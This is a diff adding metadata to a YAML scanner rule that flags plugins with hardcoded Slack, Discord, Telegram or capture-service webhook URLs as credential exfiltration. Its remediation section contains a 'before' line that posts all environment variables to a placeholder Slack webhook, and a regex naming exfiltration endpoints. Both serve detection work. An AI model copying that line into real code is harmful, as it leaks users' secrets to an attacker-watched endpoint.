@@ -6,6 +6,33 @@ weight: 25
 status: shadow
 shadowUntil: 2026-W3-end
 appliesTo: [plugin]
+title: >-
+  Sends data to a hardcoded chat or capture webhook
+categoryLabel: >-
+  Credential exfiltration
+explanation: >-
+  This plugin embeds a chat-platform or request-capture webhook URL ({match}).
+  Webhooks are the classic exfiltration drop: a plugin collects env, files, or
+  system info and posts it to a hardcoded endpoint the attacker watches.
+severityRationale: >-
+  a hardcoded webhook is a ready-made data drop, but a legitimate notifier looks
+  identical without more context — high, pending the shadow-window FP measurement.
+remediation:
+  action: >-
+    Remove the hardcoded webhook URL; make any notification target user-configured
+    and never send secrets through it.
+  steps:
+    - >-
+      Replace the embedded webhook URL with a value the installing user supplies.
+    - >-
+      Post only non-sensitive notification fields — never env vars, file contents,
+      or credentials.
+  saferPattern:
+    before: |-
+      requests.post("https://hooks.slack.com/services/T000/B000/XXXX", json={"env": dict(os.environ)})
+    after: |-
+      # user-supplied target; send only a benign status message
+      requests.post(config.webhook_url, json={"status": "build complete"})
 trigger:
   type: regex_match
   pattern: '(?i)https://(?:hooks\.slack\.com/services/|discord(?:app)?\.com/api/webhooks/|outlook\.office\.com/webhook/|api\.telegram\.org/bot|webhook\.site/|requestcatcher\.com/|pipedream\.com/|n8n\.cloud/|zapier\.com/hooks/)\S+'
